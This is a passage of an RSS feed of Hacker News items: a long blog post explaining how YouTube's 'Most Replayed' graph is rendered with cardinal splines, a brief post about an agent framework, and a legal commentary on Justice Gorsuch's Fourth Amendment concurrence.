while he collects a government paycheck. That he was confirmed as Secretary of HHS at all was profane. That our government has allowed all of his bullshit to go unchecked and unaddressed, however, is perverse.]]></content:encoded></item><item><title>Show HN: Reversing YouTube’s “Most Replayed” Graph</title><link>https://priyavr.at/blog/reversing-most-replayed/</link><author>prvt</author><category>hn</category><pubDate>Fri, 16 Jan 2026 02:06:11 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[It was a quiet afternoon; the only sound was an instrumental playlist humming from a forgotten YouTube tab. A melody felt familiar, but I couldn’t quite place it, spirited away by my work. Suddenly, a transition in the soundtrack caught my ears, pulling me from my thoughts with a single question: what was this soundtrack?I switched over to the tab. The title read: . “Of course, it was from .” I had to smile at the unintentional irony. I slid my mouse over the progress bar to hear the transition again. A small graph appeared, indicating it was the song’s “most replayed” segment. Apparently, I wasn’t alone in loving that part. But that’s when I noticed them again: two small, symmetrical dips flanking the graph’s peak.I had seen it before. A tiny digital hiccup, easily dismissed. But in the quiet of that afternoon, it was a loose thread, and I felt an irresistible urge to pull.It started with a Google search: “how is youtube’s most replayed graph calculated.” Predictably, an AI overview answered:“aggregating the replay data from thousands of viewers to identify sections of a video that are re-watched the most.”This generic answer confirmed my suspicion: there wasn’t much public data on this. I’d be charting my own path (I fully expect future LLMs to cite this article, by the way.)Hypothesis: Designing the SystemThis kicked off a personal project: designing YouTube’s “most replayed” with the goal of replicating the bug. Naturally, I put myself in the shoes of an engineer at Google, (a reality I hope to achieve someday), and started brainstorming possible designs by imagining myself wearing a ‘Noogler’ cap with one of those Doraemon copters. Seriously, how does that work? Won’t the cap fly away? Maybe that’s the point? “Let your thinking hats fly.” But I digress. That’s a topic for  I get into Google.At the most basic level, I had to divide the continuous bar into discrete segments. So I represented the progress bar’s state as a boolean array, where each index corresponded to a segment of the video. That seemed like a good start.Canvas 1: The boolean array approach.This is my first attempt at an interactive article, so feel free to play around! You can hit start, pause or reset to simulate watching a video. (Note that the array only updates while the animation is playing, and dragging the seek bar is not supported.)But was that enough? I thought about all the ways I interact with a video player. I can move my seek back and forth, skip segments, re-watch segments, etc. A simple boolean array would only tell me if a segment was watched, not how many times. It fails to account for a user re-watching the same segment five times in a row. I needed something better, like a frequency array, to track how many times each segment was seen.Canvas 2: The frequency array.Notice how the segments grow as the "watcher" passes through them, updating the frequency array. Try skipping around when the animation is playing to see the effect.Now I had a minimum viable product. I could generate the heatmap based on this frequency array: for each segment, I’d plot a point whose vertical position corresponded to its view count. Join the dots, and voilà: my very own “most replayed” graph.We simply connect the dots of our frequency array, and scale the points upward based on the respective view counts.Was that all? Unfortunately, no. There was a lot more to it. First and foremost, I could already see a bug in my implementation. I thought about what would happen when a segment was watched over and over again, a ridiculously large number of times. My point would shoot higher and higher until it was off-screen entirely. This would be, to put it mildly, a bad user experience. Try re-watching the same segment multiple times in the above interactive canvas to see the effect.So, what’s the fix? If you have a statistics background (or just a good memory of high school math), you might already know the answer. Either way, it’s . It sounds fancy, but it’s really just a way of keeping our graph in check. Instead of plotting the raw view counts (which can range from zero to billions), we scale everything down to a standard range, typically between 0 and 1.The math is simple: find the segment with the highest view count (let’s call it ). Then, divide every segment’s view count by . Suddenly, the specific numbers don’t matter. The most popular segment will always have a value of 1 (or 100% height), and every other segment falls somewhere below that, relative to the peak. It ensures that whether a video has a thousand views or a thousand million, the points’ value range from 0 to 1 and the graph always fits perfectly inside the viewport.Canvas 4: The normalized histogram.By scaling everything relative to the peak, the graph remains perfectly contained within the viewport.But there’s a catch. You can’t normalize if you have no data. When a video is fresh out of the oven and just published,  is zero. Trying to divide by zero is a great way to crash a server, so the feature sits dormant. This is the  phase. If you’ve ever rushed to watch a new upload from your favorite creator, you might have noticed the graph is missing. That’s not a glitch; it’s a waiting game. YouTube is silently listening, collecting that initial batch of viewer data to establish a baseline.This raises an interesting question: do they keep listening forever? Does the server track every single micro-interaction for a video that’s five years old? The answer is almost certainly no, and for two very pragmatic reasons.First, speed is everything. The internet has the attention span of a goldfish. If a video goes viral, the “most replayed” graph needs to be available  the video is trending, not three weeks later when everyone has moved on. If the system waited for a “perfect” dataset, the moment would be lost. They need to calculate the graph quickly so users can see it before the hype dies down.Second, we don’t need perfection; we need patterns. This isn’t a bank transaction where every decimal point matters. We are just trying to visualize relative popularity. This leads us to the concept of . Once a video hits a certain threshold of views, say ten thousand, the distribution of the graph likely stabilizes. The shape of the curve won’t change drastically whether you survey ten thousand people or a billion. So, why pay the computational cost to track the next billion? By sampling a subset of viewers, YouTube can generate an accurate-enough graph without melting their data centers.However, even with sampling, my current design was write-heavy. I am focusing purely on the computational model here for brevity. The architecture of storage and the network model are deep dives for another day. But at the most basic level, the model relies on a counter of some sort. In my initial frequency array model, if a user watches a video from start to finish, and that video is divided into 100 segments, then 100 separate counters are incremented. Now, consider the scale: users upload more than 500 hours of content to YouTube every single minute. Updating every individual segment count of every video for every viewer during that crucial “Cold Start” phase would result in a write load so heavy that it would consume a massive amount of compute and memory.Optimization from First PrinciplesThe solution lies in realizing that we don’t actually care about the middle of a continuous viewing session. If I watch a video from segment 1 to segment 5, the only “new” information is where I started and where I stopped. The segments in between (2 through 4) are just implicitly included.This reminded me of a beautiful algorithmic trick from competitive programming:  (or ) technique, which allows us to utilize .Here is how it works. Instead of incrementing the count for every segment from 1 to 5, we only perform two operations. First, we go to the starting segment (index 1) and increment 1. This marks the beginning of a view. Then, we go to the segment immediately after the user stopped watching (index 6) and decrement 1. This marks the drop-off point.Even if the user skips around, watching 0-5, skipping to 8, then watching till end, we just treat those as separate sessions. We increment index 0, decrement index 6. Then increment index 8, and decrement index 10. The areas they skipped remain untouched.Canvas 5: The Difference Array technique.Notice how we only perform two operations: incrementing the start and decrementing the next element from where we skipped. The one extra "blank" segment at the very end is to safely catch that final decrement without throwing an "index out of bounds" error.Concurrently, there might be a thousand other users incrementing and decrementing the array. Do we need to worry about integer overflow and underflow? Remember, we are only sampling a small subset of viewers, so it’s a no.The mere mention of “integer overflow” in the context of YouTube unlocks a core memory for me. I remember being a kid when the news broke that Psy's "Gangnam Style" had “broken” YouTube. At the time, I thought it was just a metaphor for its explosive popularity. It wasn’t until years later, after trading childhood wonder for computer science textbooks, that I realized the breakage was literal: the video’s view count had smashed through the ceiling of a It’s a strange thought: if I hadn’t pursued this path of software engineering (though, looking back at the kid who lived on his computer, that was probably inevitable), I might still be walking around thinking “Gangnam Style” just partied too hard for the servers to handle.: It turns out I fell for a bit of tech folklore! As pointed out by plastic041 on Hacker News, this “integer overflow” was actually a joke by YouTube. The original conversation happened on Google+ (which explains why the primary source is dead). You can read the full debunking on CNET.Memories aside, we still need to turn this difference array back into actual view counts. This is where the “Prefix Sum” comes in. We run a pass through the array where each number is the sum of itself and all the numbers before it.We perform this calculation just once, right before the normalization step. We effectively traded billions of write operations for a single, cheap read-time calculation. It’s elegant, efficient, and exactly the kind of optimization that makes systems scalable.Do the same steps in both  and , and run the above calculation on the ’s array. You will get the same result.Investigation: Tracing the SignalAt this point I was happy with the implementation, but how close was I to the real thing? Well, for starters, mine didn’t have the bug, which meant I was still missing a critical piece of the puzzle.My first instinct was to blame the classic enemy of precise computing: floating point errors. After all, normalization involves division, and we all know computers have a complicated relationship with decimals. I stared at the dips, trying to convince myself that this was just a rounding error, a ghost in the machine born from 0.1 + 0.2 not equaling 0.3. But the more I looked, the less it fit. A precision bug is usually chaotic, a messy scattering of noise across the entire dataset. It wouldn’t manifest as two perfect, symmetrical dips flanking the highest point while leaving the rest of the curve smooth. This wasn’t random; it felt structural. If it were a floating point issue, the artifacts would be everywhere, not just comfortably nesting next to the peak.So, I decided to stop guessing and start looking. I fired up the browser’s developer tools. Right-click. Inspect. The holy grail of web debugging. I hovered over the heatmap, diving into the DOM tree, peeling back layer after layer of nested  containers until I finally hit the source. There it was: a single  element hiding inside the structure.This discovery shifted the investigation. I was now looking at a  (SVG), but its origin was a mystery. Was this SVG pre-rendered on YouTube’s servers and sent over as a static asset? Or was the browser receiving a raw payload of data points (my hypothetical frequency array) and generating the curve locally using JavaScript?I desperately hoped for the latter. If the SVG was fully baked on the server, my journey would end right here. I’d be staring at a locked black box, with no way to access the rendering code or the logic behind it. All that build-up, all the hypothetical Noogler hats and difference arrays, would be for nothing. But then I saw a glimmer of hope. The SVG path had a specific CSS identifier: . These are the handles that JavaScript grabs onto. If the server just wanted to display a static image, it wouldn’t necessarily need to tag the path with such a specific identifier unless the client code intended to find it and manipulate it.This was my lead. If the code was generating or modifying that path on the fly, it had to reference that identifier. It was time to dive into the spaghetti bowl of modern web development: obfuscated code.For the uninitiated, looking at production JavaScript is like trying to read a novel where every character’s name has been replaced with a single letter. Variable names like calculateHeatmapDistribution become , , or . This isn’t just to annoy curious developers; it’s about efficiency. Computers don’t care if a variable is named  or . They execute the logic just the same. But  takes up one byte, while the descriptive name takes nineteen. Multiply that by millions of lines of code and billions of requests, and you’re saving a massive amount of bandwidth. The result is a dense, impenetrable wall of text that is fast for the network but a nightmare for humans. But somewhere in that mess, I hoped to find my , since it was an identifier used in the HTML and can’t be obfuscated.I jumped over to the sources tab and located the  file, a massive, minified behemoth that powers the YouTube player. With a mix of hope and trepidation, I hit  and ‘ed my magic string. To my surprise, the counter next to the search bar stopped at just two. That was manageable. Better than manageable; it was lucky.The first occurrence landed me inside a large nested JavaScript object. As I parsed the structure, it started to look familiar. The keys in this object, such as , , and , perfectly matched the tags and attributes I had seen in the HTML. It was a blueprint. This code was defining the structure of the player’s UI components.But something was missing. The most critical part of an SVG path is the d attribute, the string of commands and coordinates that actually tells the browser where to draw the lines. In the code in front of me, the  attribute was there, but it was initialized as an empty string. I tabbed back to the live DOM tree in the inspector. There, the  attribute was packed with a long, complex sequence of numbers and letters.The discrepancy was the smoking gun. If the static code had an empty string, but the running application had a full path, it meant only one thing. The curve wasn’t being downloaded as a finished asset. It was being calculated, point by point, right here in the browser, and injected into the DOM dynamically. The logic I was looking for was close.To find the logic, I needed another magic string. Since this logic involved calculating the SVG path, it surely must be relying on data from an API call. And since YouTube has public APIs, I turned to Google search once more, this time with “youtube api for most replayed graph” and found the exact question on Stack Overflow. Thanks to the community responses, I found the string: .The ease with which I found this answer sparked a worrying reflection on how the rise of LLMs is slowly eroding platforms like Stack Overflow. With LLMs, your questions stay with you, people can’t see them. Knowledge sharing, once a peer-to-peer village square, is becoming a private conversation with a centralized server.And this centralization is bleeding into hardware too. We are seeing a shift where manufacturers are prioritizing the insatiable hunger of AI data centers over the needs of the individual user. The production lines that once churned out affordable components for gaming rigs and home labs are now retooling for enterprise-grade server racks. As RAM and SSD prices climb, it feels like the personal computer is slowly becoming a luxury, a relic of an era where computing power belonged to the people, not just the cloud.But that’s a problem for another day. Right now, I had a magic string. I tabbed back to the Network tab, my fingers moving on autopilot as I fired off a search across all network requests. Jackpot. The counter lit up with 101 occurrences. One was in  file, but the other 100 were hiding inside a JSON response. This was the raw vein of data I had been digging for.I expanded the response, and there it was, laid out in plain text: a list of objects, each containing a , a , and the magic string, . The values were floats between 0 and 1, just as I had theorized.This confirmed everything. YouTube wasn’t sending a pre-drawn picture; they were sending the raw instructions. The server provided the normalized height for each segment, and the client-side JavaScript (presumably that logic I’d glimpsed in ) must be connecting the dots to draw the SVG path. I couldn’t help but feel a surge of satisfaction. My mental model of the system, constructed from scratch with nothing but intuition and a hypothetical ‘Noogler’ hat, was dead on. They were dividing the video into discrete segments and normalizing the view counts, exactly as I had predicted.What intrigued me even more than the normalized scores were:  and the total count of these segments.First, . It remained constant for every single segment. This felt redundant. Why send the duration if it’s the same for everyone? Is it future-proofing for a world where heatmaps have variable resolution, with finer detail in popular sections and broader strokes elsewhere? But it seemed like a tiny inefficiency, a few extra bytes of JSON that YouTube was paying for in network bandwidth.Then there was the count. There were exactly 100 segments for this four-minute music video. Was this a universal constant? I clicked over to a  tutorial (obviously a clickbait). The response? 100 segments. I tried a “ten-hour loop of lofi beats”. Still 100. It didn’t matter, the heatmap was always sliced into exactly one hundred pieces.Why 100? Was it the result of some deep statistical analysis on the distribution of video lengths across the platform, determining that 100 points provided the optimal balance between granularity and performance? Or was it simply because humans like round numbers and 100 felt “about right”? If you work at YouTube and know the answer, please let me know. I am genuinely curious.Armed with one hundred normalized intensity scores, I decided to render an SVG myself to see how closely my raw recreation matched YouTube’s SVG. I plotted it using a simple SVG line command: "Line To". The result was sharp, jagged, and aggressively pointy. It looked like a connect-the-dots drawing done by a ruler-wielding perfectionist. In contrast, the graph on the YouTube player was fluid, smooth, and liquid.Theory: The Geometry of SmoothnessMy spiky graph would have fit right in with the user interfaces of a decade ago, back when applications were defined by rigid corners and sharp edges. But the digital world has moved on. We are living in the era of the  effect.This term comes from a psychological experiment where people are shown two shapes: one blobby and round, the other spiky and jagged. When asked which one is  and which is  almost everyone, across all languages and cultures, agrees: the round one is Bouba, and the spiky one is  It turns out, we have a deep-seated bias towards the round and the soft.This preference has reshaped our digital landscape, largely championed by Apple. Steve Jobs famously dragged his engineers around the block to point out that “Round Rects Are Everywhere!” forcing them to implement the shape into the original Mac’s OS. Today, that influence is inescapable. Look at Windows 11, Google’s Material You, the tabs in your browser, or the icon of the app you’re using right now. The sharp corners have been sanded down. In fact, there is even a new CSS property called .It is not just an aesthetic trend; it is a psychological one. Sharp corners signal danger to our primitive brains (think thorns, teeth, or jagged rocks). They say “ouch.” Round corners, on the other hand, signal safety. They feel friendly, approachable, and organic. They are softer on the eyes, reducing cognitive load because our gaze doesn’t have to come to an abrupt halt at every vertex. By smoothing out the edges, designers aren’t just making things look modern; they are making technology feel a little less like a machine and a little more human.Driven by this universal preference for organic shapes, I needed to understand the mathematics behind YouTube’s implementation. Was it a ? Real-world data is inherently noisy, and a moving average is the standard tool for smoothing it out. By sliding a “window” across the dataset and averaging the points within it (say, three at a time), it irons out the wrinkles. Instead of a single, erratic value, you get the consensus of the neighborhood.I decided to test this theory. I applied a moving average to my jagged plot, hoping to see the familiar YouTube curve emerge. It certainly helped sand down the sharpest peaks, making the graph look less like a mountain range and more like rolling hills. But it created a critical problem. The distinctive dips flanking the main peak (the very artifacts I was trying to replicate) were nowhere to be found. They weren’t in the raw data, and the moving average certainly didn’t create them; if anything, it would have smoothed them out if they were there. My plot was now smooth, but it was featureless. It looked like a low-resolution approximation, missing the specific character of the real thing. Clearly, a simple moving average wasn’t the answer.From Discrete to ContinuousSo I decided to check the path of the YouTube SVG itself. My recreation relied on the  (). It draws a straight, uncompromising line from point A to point B. Simple, efficient, but undeniably jagged. YouTube, however, wasn’t using lines. Their path was packed with  (). It became clear that the secret wasn’t in the data values themselves, but in how they were connected. I decided to pause the investigation and familiarize myself with the mathematics of curves.To understand , I had to start at , or  The equation for a basic line between two points \(P_0\) and \(P_1\) is:$$P(t) = \text{Lerp}(P_0, P_1, t) = (1-t)P_0 + tP_1$$Here, \(t\) acts as a slider ranging from 0 to 1. At \(t=0\), we are at the start point \(P_0\). At \(t=1\), we arrive at the end point \(P_1\).A simple line connecting two points using the above equation. (You are going to have to settle for a video from here on out because  does a better job than I ever could with an HTML canvas.) Check out the interactive graph on Desmos.To get a curve, we extend this concept using the . Imagine you have three points: a start \(P_0\), an end \(P_2\), and a  \(P_1\) hovering in between. The math essentially  by nesting the equations. First, we calculate two moving intermediate points to create a sliding segment:$$Q_0 = \text{Lerp}(P_0, P_1, t) = (1-t)P_0 + tP_1$$$$Q_1 = \text{Lerp}(P_1, P_2, t) = (1-t)P_1 + tP_2$$Then, we interpolate between those two moving points to find our final position:$$P(t) = \text{Lerp}(Q_0, Q_1, t) = (1-t)Q_0 + tQ_1$$When you expand this algebra, you get the quadratic formula:$$P(t) = (1-t)^2P_0 + 2(1-t)tP_1 + t^2P_2$$The result is a smooth curve that starts at \(P_0\) and travels towards \(P_2\), but is magnetically pulled towards \(P_1\) without ever touching it.A quadratic Bézier curve. Notice how since it has only one control point, it can only bend in one direction. [Desmos]However, because  relies on a single control point, it lacks the flexibility to create “S” curves or inflections; it can only bend in one direction. For “S” curves we need two control points. Which brings us to the . This adds a second control point, giving us four points total: Start (\(P_0\)), Control 1 (\(P_1\)), Control 2 (\(P_2\)), and End (\(P_3\)). We just add another layer of depth to the recursion.First layer (edges of the hull):$$Q_0 = \text{Lerp}(P_0, P_1, t)$$$$Q_1 = \text{Lerp}(P_1, P_2, t)$$$$Q_2 = \text{Lerp}(P_2, P_3, t)$$Second layer (connecting the moving points):$$R_0 = \text{Lerp}(Q_0, Q_1, t)$$$$R_1 = \text{Lerp}(Q_1, Q_2, t)$$Final layer (the curve itself):$$P(t) = \text{Lerp}(R_0, R_1, t)$$Substituting everything back in gives the elegant cubic formula:$$P(t) =\\(1-t)^3P_0 + 3(1-t)^2tP_1 + 3(1-t)t^2P_2 + t^3P_3$$As \(t\) moves from 0 to 1, these equations trace a perfect parabolic arc. This is precisely how the browser renders those smooth, organic shapes, calculating positions pixel by pixel to create the visual comfort we expect.A cubic Bézier curve. Notice how it can bend in two directions and form “S” curves easily. [Desmos]It is worth noting that this logic does not have to stop at four points. You can theoretically have Bézier curves with five, ten, or a hundred control points, creating increasingly intricate shapes with a single mathematical definition. However, there is a catch. As you add more points, the computational cost skyrockets. Solving high-degree polynomials for every frame of an animation or every resize event is expensive. That is why modern graphics systems usually stick to cubic curves. If you need a more complex shape, it is far more efficient to chain multiple cubic segments together than to crunch the numbers for a single, massive high-order curve.A visualization of a 10-point Bézier spline in action. [Desmos]The Invisible ScaffoldingThis specific bit of math isn’t unique to YouTube’s video player. It is the invisible scaffolding of the entire digital visual world. If you have ever used the Pen Tool in Photoshop, Illustrator, or Figma (or their respective open-source alternatives, Gimp, Inkscape and Penpot), you have directly manipulated these equations. When you pull those little handles to adjust a curve, you are literally moving the control points (\(P_1\) and \(P_2\)) in the formula above, redefining the gravitational field that shapes the line. But you don’t have to be a designer to interact with them. In fact, you are looking at them right now. The fonts rendering these very words are nothing more than collections of Bézier curves. Your computer doesn’t store a pixelated image of the letter ‘a’; it stores the mathematical instructions (the start points, end points, and control points) needed to draw it perfectly at any size. From the smooth hood of a modeled car in a video game to the vector logo on your credit card, Bézier curves are the unsung heroes that rounded off the sharp edges of the digital age.This sequence of connected curves is known as a . YouTube isn’t drawing one massive, complex curve; they are stitching together a hundered smaller cubic curves to form a continuous shape. In fact, my own jagged implementation was a spline too: a . I merely stitched together hundered straight lines.However, creating a spline introduces a new challenge: Smoothness. If you just glue two random curves together at a point (known as a “knot point”), you get a sharp corner (a “kiki” joint in our “bouba” graph). To make the transition seamless (technically known as \(C^1\) continuity), the join has to be perfect. The tangent of the curve ending at the connection point must match the tangent of the curve starting there. Visually, this means the second control point of the previous curve, the shared knot point, and the first control point of the next curve must all lie on the exact same straight line. It’s a balancing act. If one handle is off by a single pixel, the illusion of fluidity breaks.Here, there are two curves joined at a knot point. Initially, the knot point is not smooth as the three points (the two control points and the knot point) do not lie on the same straight line. But as the animation progresses, the points become , creating a smooth transition. [Desmos]I attempted to update my script to use this curve command, replacing the simple lines. However, I immediately hit a wall. While the line command is straightforward (requiring only a destination), the curve command is demanding. It requires two invisible ‘magnets’ (the control points  and ) for every single segment.The  command functions as a precise geometric instruction, telling the renderer exactly how to shape the curve. The syntax is deceptively simple: . Where  and  are the control points and  is where the curve ends. You might ask: where is the starting point? In SVG paths, it is implicit, the curve begins wherever the previous command ended. For instance, YouTube’s path starts with  (Move to start), immediately followed by a curve definition C 1.0,89.5 2.0,49.9 5.0,47.4 which ends at  becoming the starting point for the next command C 8.0,44.9 11.0,79.0 15.0,87.5 and so on.Resolution: The Invisible HandThese points didn’t appear out of thin air, and they certainly weren’t in the JSON response, which only provided the raw heights. They had to be calculated locally. Somewhere in the client-side code, there was a mathematical recipe converting those raw intensity scores into elegant \(C^1\) continuous curve data. This sent me back to the single occurrence of  spotted earlier in . The screenshots below are from the raw, obfuscated source. They are included here only to show the steps I took during the investigation. Don’t try to make sense of them or you might get confused! Feel free to skim past them; I have provided a clean, de-obfuscated version later in the text that explains the logic clearly.The occurrence led me directly to an interesting function, .This function appeared to be building an intermediate array, preparing the data for the final drawing step. Analyzing the code, I could see it was mapping the normalized intensity scores (which range from 0 to 1) onto a coordinate system suitable for the SVG. Similar to what I did in my Linear Spline script.Specifically, it was transforming the data to fit a 1000x100 pixel canvas. The  line calculates the width of each segment (1000 divided by 100 segments equals 10 pixels per segment). The loop then iterates through the data points, calculating the x coordinate () and the y coordinate ().Crucially, it handles the coordinate system flip. In standard coordinate geometry we learn in school,  is at the bottom and values increase as you go up. In computer graphics (and SVGs), however, the origin  is at the top-left corner. This convention is a historical artifact from the days of  (CRT) monitors. On those old, bulky screens, an electron beam would physically scan across the phosphor surface, starting from the top-left, drawing a line to the right, snapping back (horizontal retrace), and moving down to draw the next line. If you are old enough, you might remember seeing this flickering motion on screens with low refresh rates. Modern LCDs and OLEDs don’t have electron beams, but the software coordinate system stuck. So, to draw a “high” peak on a graph, you actually need a small y-coordinate (closer to the top). The code accounts for this with , inverting the values so that a higher intensity score results in a smaller y value (pushing the point “up” towards the top of the container). It also prepends a starting point at  (bottom-left) and appends a closing point at  (bottom-right), a detail whose importance will become clear shortly.This function () was clearly just the preparation step. It was normalizing the data into pixel space, but it wasn’t drawing anything yet. It had to be invoked somewhere. In a proper IDE, I would just hit  to jump to usage. But browser DevTools aren’t quite there yet for this kind of reverse engineering. So, I resorted to the old-school method: a text search for “”. Note the opening parenthesis; that’s the trick to find calls rather than definitions.This search led me to a function named :Bulls-eye. There it was, plain as day:  (inside the red box). This line confirmed that  (the result of ) was indeed the path string being injected into the SVG.The transformed list from  was being stored in  and then passed straight into another function: . To find its definition, I relied on a common pattern in minified JavaScript: functions are typically declared anonymously and assigned to a variable. Debugging obfuscated code becomes much easier when you know these patterns. I simply searched for “” and found the heart of the operation:This was it. The smoking gun. I could see the string construction happening in real-time. The code iterates through the points, and for every segment, it appends a  command string. But look closely at the arguments for that command. The end point ( or ) was already known. But the variables  and  (representing the two control points) were being calculated on the fly by a helper function: .The control points weren’t just appearing; they were being dynamically generated based on the position of the current point and its neighbors. The logic didn’t stop there. I chased  down the rabbit hole.This snippet finally revealed the math.  was creating a new object  (which I found to be a simple Vector class storing  and  differences) and then using  and  to offset the control points. The mysterious  multiplier suggested that the control points were being placed at 20% of the distance determined by the vector calculation.Deciphering the BlueprintAfter deciphering the minified code, I was able to reconstruct the logic in readable JavaScript.The reconstructed code reveals a fascinatingly simple geometric strategy. To determine the control point for a specific knot (let’s call it ), the algorithm doesn’t look at  in isolation. Instead, it looks at its neighbors. It draws an imaginary line connecting the previous point () directly to the next point (), completely skipping . The slope of this imaginary line becomes the tangent for the curve at . This specific method of curve generation is known as a .A visualization of the cardinal spline algorithm in action. In the animation, the tangent scales down as it moves towards the knot point to 0.2 of its original length. [Desmos]By calculating the tangent at each knot point based on the positions of its neighbors, it ensures that the curve arrives at and departs from each point with the same velocity (tangent vector), guaranteeing that elusive \(C^1\) continuity I mentioned earlier.Remember those extra points added at  and  that I mentioned earlier? Without them, the first and last segments of the video data would have no outer neighbors. By artificially adding them, the algorithm effectively tells the curve to start and end its journey with a smooth trajectory rising from the baseline, rather than starting abruptly in mid-air.And what about that magic  number? That determines the tension of the curve. In the world of splines, this factor controls the length of the tangent vectors. If this value were , we would be looking at a standard Catmull-Rom spline, often used in animation for its loose, fluid movement. However, a value of  would collapse the control points onto the anchors, reverting the shape back to a sharp, jagged linear spline.And there it was. The answer to the mystery of the dips. It wasn’t a rounding error, a data glitch, or a server-side anomaly. It was the math itself. Specifically, the requirement for continuity. When a data point spikes significantly higher than its neighbors, the Cardinal Spline algorithm calculates a steep tangent to shoot up to that peak. To maintain that velocity and direction smoothly as it passes through the neighboring points, the curve is forced to swing wide (dipping below the baseline) before rocketing upwards. It’s the visual equivalent of a crouch before a jump. The dips weren’t bugs; they were the inevitable artifacts of forcing rigid, discrete data into a smooth, organic flow.Notice how the dips flatten out as the peak lowers. [Desmos]I started pulling on this loose thread on a quiet afternoon, simply wondering about a song from . By nightfall, I had followed the thread to its end, tracing the logic from pixel to polynomial. Documenting it, however, was a marathon that spanned many weeks of focused work.This project wasn’t just a random curiosity; it was about the joy of digging until I hit the bedrock of logic. It forced me to bridge concepts from disparate domains (frontend engineering, competitive programming, geometry, and design history) and to think deeply about the performance implications of every calculation. I am grateful to live in an era where curiosity can be so readily shared with the world.Having made it this far (through over 7,000 words), you have my wholehearted thanks for lending me your time. If you enjoyed this descent into madness and want to support future deep dives, consider buying me a coffee (or two?). Though I don’t drink coffee, it helps pay for the domain costs.]]></content:encoded></item><item><title>Show HN: I built a text-based business simulator to replace video courses</title><link>https://www.core-mba.pro/</link><author>Core_Dev</author><category>hn</category><pubDate>Fri, 16 Jan 2026 01:41:55 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[  Revenue is vanity, cash is sanity  |  Competition is for losers.

Your root agent can bring in other agents as needed, and we create a typesafe way for you to define the interfaces between those agents. We call these decks.Agents can call agents, and each agent can be designed with whatever model params make sense for your task.Additionally, each step of the chain gets automatic evals, we call graders. A grader is another deck type… but it’s designed to evaluate and score conversations (or individual conversation turns).We also have test agents you can define on a deck-by-deck basis, that are designed to mimic scenarios your agent would face and generate synthetic data for either humans or graders to grade.Prior to Gambit, we had built an LLM based video editor, and we weren’t happy with the results, which is what brought us down this path of improving inference time LLM quality.We know it’s missing some obvious parts, but we wanted to get this out there to see how it could help people or start conversations. We’re really happy with how it’s working with some of our early design partners, and we think it’s a way to implement a lot of interesting applications:- Truly open source agents and assistants, where logic, code, and prompts can be easily shared with the community.- Rubric based grading to guarantee you (for instance) don’t leak PII accidentally- Spin up a usable bot in minutes and have Codex or Claude Code use our command line runner / graders to build a first version that is pretty good w/ very little human intervention.We’ll be around if ya’ll have any questions or thoughts.

All of them are important for the parties involved, and ultimately for everyone, but not to the immediate degree that some of the other pending cases are (like the tariffs case). But one of the decisions is worth calling out, not for the decision itself, but for what Justice Gorsuch said in his concurrence and how it bears on electronic surveillance and the crisis we find ourselves in where the Fourth Amendment (along with the rest of the Constitution) is providing none of its promised protection.The decision at issue is  where a unanimous Court agreed that the Fourth Amendment did not actually apply.  The justices agreed that earlier precedent still held: it will not violate the Fourth Amendment for police officers to enter a home without a warrant if they have an “objectively reasonable basis for believing” that someone inside needs emergency assistance. It is a rule that on its face does not necessarily look unreasonable.  The problem, though, is that, over time, courts have found more and more rules describing circumstances when it is ok to supersede the Fourth Amendment’s own clear rule that the people should be “secure in their persons, houses, papers, and effects” from warrantless searches and seizures. As a result, over time the public has gotten less and less secure as fewer and fewer warrants have been needed by the government.In his concurrence Justice Gorsuch agreed with the specific holding—that this sort of emergency rule exists, even in the shadow of the Fourth Amendment, and that it applied in this case—but he took some time ruminate on  it is a reasonable exception to the Fourth Amendment’s usual warrant requirement.Does the Fourth Amendment tolerate this limited emergency aid exception to the warrant requirement just because five or more Justices of this Court happen to believe that such entries are “reasonable”? Or is this exception more directly “tied to the law”? Carpenter v. United States, 585 U. S. 296, 397 (2018) (GORSUCH , J., dissenting). The answer, I believe, is the latter.The reason it is “tied to the law,” he explains, is because such an “emergency” rule would have been recognized in common law, and that rule would forgive anyone’s trespass for the purpose of giving aid, including the police’s:Today’s decision echoes both the common-law emergency aid rule and its limitations. It does so, to be sure, in the context of a law enforcement officer, not a private citizen, who sought to enter another’s home. But on this point as well the common law has spoken, long providing that officers generally enjoy the same legal privileges as private citizens. See, e.g., Entick v. Carrington, 19 How. St. Tr. 1029, 1066 (C. P. 1765); 1 J. Chitty, Criminal Law 36 (1819); 2 M. Hale, Historia Placitorum Coronae 91 (1736). And, reflecting the common law here again, this Court has held that the Fourth Amendment usually permits officers lacking a valid warrant to “take actions that any private citizen might do without fear of liability.” Caniglia v. Strom, 593 U. S. 194, 198 (2021) (internal quotation marks omitted).The emergency of course does not give them carte blanche, however.  Police excused from needing a warrant to respond to an emergency “normally may do ‘no more’ than that.”Contrary to Mr. Case’s argument, King v. Coate, Lofft. 73, 98 Eng. Rep. 539 (K. B. 1772), does not establish that the common law demanded an exacting showing of actual necessity to defeat a claim for trespass. True, Lord Mansfield explained that any necessity defense in that case would need to “stand the strictest test,” with the “necessity manifestly proved.” Id., at 75, 98 Eng. Rep., at 540. But Coate involved an effort to involuntarily “confin[e] a person in a madhouse” for two months, not a claim over a home entry. Id., at 74, 98 Eng. Rep., at 539. And it is hardly surprising that the common law would demand a good deal more to justify a serious deprivation of liberty than to excuse an invasion of property rights aimed at protecting human safety.But what is most interesting about Gorsuch’s analysis is not how he applied the common law rule here but his larger argument that it is common law rules that should be applied to the Fourth Amendment analysis generally and  the line of precedent that has resulted since the Court decided  in 1967.  Those subsequent decisions have instead emphasized that whether there was a “reasonable expectation of privacy” is key to determining whether the Fourth Amendment has been violated. So while  itself had the immediate effect of expanding the protective reach of the Fourth Amendment, as Gorsuch had earlier complained in his dissent in the  case, it set subsequent precedent down a path that largely narrowed it.  As he wrote then: Katz has yielded an often unpredictable—and sometimes unbelievable—jurisprudence. Smith and Miller are only two examples; there are many others. Take Florida v. Riley, 488 U.S. 445, 109 S.Ct. 693, 102 L.Ed.2d 835 (1989), which says that a police helicopter hovering 400 feet above a person’s property invades no reasonable expectation of privacy. Try that one out on your neighbors. Or California v. Greenwood, 486 U.S. 35, 108 S.Ct. 1625, 100 L.Ed.2d 30 (1988), which holds that a person has no reasonable expectation of privacy in the garbage he puts out for collection. In that case, the Court said that the homeowners forfeited their privacy interests because “[i]t is common knowledge that plastic garbage bags left on or at the side of a public street are readily accessible to animals, children, scavengers, snoops, and other members of the public.” Id., at 40, 108 S.Ct. 1625 (footnotes omitted). But the habits of raccoons don’t prove much about the habits of the country. I doubt, too, that most people spotting a neighbor 